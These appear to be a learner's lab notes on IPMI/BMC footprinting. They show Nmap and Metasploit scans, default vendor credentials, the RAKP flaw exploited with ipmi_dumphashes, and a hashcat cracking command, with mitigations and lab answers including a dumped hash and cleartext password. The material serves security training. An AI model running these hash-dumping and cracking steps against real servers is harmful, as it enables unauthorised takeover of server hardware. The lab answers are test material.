**Intelligent Platform Management Interface (IPMI)** is a system used for **remote management and monitoring** of servers. It works **independently from the main operating system**, meaning it still functions even if the server is powered off, frozen, or not responding.
## What IPMI allows admins to do

Admins can manage a system even when:

- The OS hasn’t booted yet (to change BIOS settings)
- The server is completely powered off
- The system has crashed or failed
IPMI works through a **direct network connection to the hardware**, not the operating system.

## What IPMI can monitor

When not being used for recovery tasks, it can monitor:
- Temperature
- Voltage
- Fan status
- Power supply health
It can also:
- Query hardware inventory
- Read hardware logs
- Send alerts through SNMP

Note: The server itself can be off, but the IPMI module still needs **power** and a **LAN connection**.


## Components required for IPMI

1. **BMC (Baseboard Management Controller)**  
    The main micro-controller that runs IPMI.
2. **ICMB (Intelligent Chassis Management Bus)**  
    Lets different chassis communicate with each other.
3. **IPMB (Intelligent Platform Management Bus)**  
    Extends the BMC to other components inside the system.
4. **IPMI Memory**  
    Stores logs, event data, and other IPMI information.
5. **Communication Interfaces**  
    Includes serial, LAN, local system interfaces, ICMB, and PCI management buses.
## Footprinting IPMI
IPMI uses **UDP port 623**.  
Devices that speak this protocol are called **BMCs (Baseboard Management Controllers)**.

A BMC is basically a small computer (usually ARM running Linux) that is connected directly to a server’s motherboard. Many servers already include a BMC, but you can also add one using a PCI card. Common examples are:
- **HP iLO**
- **Dell DRAC**
- **Supermicro IPMI**

If you gain access to a BMC, you can almost fully control the server as if you were physically touching it. You can:

- Turn it on/off
- Reboot it
- Monitor it
- Reinstall the OS

Because of this, compromising a BMC is almost the same as having physical access to the machine.

Most BMCs expose:

- A **web management interface**
- A **remote command interface** (SSH or Telnet)
- **Port 623/UDP** for IPMI
### Nmap

```shell-session
Ssil3nce@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```
### Metasploit Version Scan
```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### BMCs Default Passwords
| Product         | Username      | Password                                                                  |
| --------------- | ------------- | ------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                    |
| HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                     |
|                 |               |                                                                           |

## Dangerous Settings

IPMI 2.0 has a built-in flaw in the **RAKP authentication protocol**.  
If you know a valid username, the BMC will send a **salted SHA1/MD5 password hash** before authentication finishes.  
This lets you **dump the hash and crack it offline**.
### Why it's dangerous
- Works on any BMC user account
- Lets you fully take over the BMC
- Passwords are often reused across servers → leads to root access elsewhere
- The flaw **cannot be fixed** (part of IPMI design)
### Cracking example (Hashcat)

For HP iLO default passwords (8 chars, uppercase + numbers):

`hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`
### Mitigations

- Use long, strong passwords
- Restrict network access (segment BMCs away from users)
- Block or limit access to **UDP 623**
### Tool to extract hashes
- **Metasploit:** `auxiliary/scanner/ipmi/ipmi_dumphashes`
### Metasploit Dumping Hashes
```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Activities

>  What username is configured for accessing the host via IPMI?
>  **Answer:** Admin

Steps took:
1. I have used [IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version)](auxiliary/scanner/ipmi/ipmi_version)) from metasploit.
2. Set rhosts {Target IP}
3. ![Pasted image 20251120170342](../../IMAGES/Pasted%20image%2020251120170342.png)
4. ![Pasted image 20251120170439](../../IMAGES/Pasted%20image%2020251120170439.png)
5. ![Pasted image 20251120170532](../../IMAGES/Pasted%20image%2020251120170532.png)

>  What is the account's cleartext password?
>  **Answer:** trinity

Steps took:
1. Took the hash from the metasploit hasdump: f4bb68808200000012975ecab0802aa159815377233eb0bb73978326f3079034bedcf0694e9da7e6a123456789abcdefa123456789abcdef140561646d696e:2bcc7c15adc10b1cae1b91d8f2184120c418c6c2
2. ![Pasted image 20251120171715](../../IMAGES/Pasted%20image%2020251120171715.png)